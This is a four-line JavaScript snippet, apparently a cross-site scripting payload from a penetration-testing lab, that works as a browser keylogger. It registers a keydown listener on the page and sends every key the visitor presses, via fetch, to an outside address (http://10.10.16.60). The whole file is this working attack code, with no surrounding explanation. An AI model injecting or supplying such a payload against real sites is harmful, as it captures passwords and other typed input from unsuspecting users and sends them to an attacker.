function logKey(event){
	fetch("http://10.10.16.60/?key=" + event.key);
}
document.addEventListener('keydown', logKey);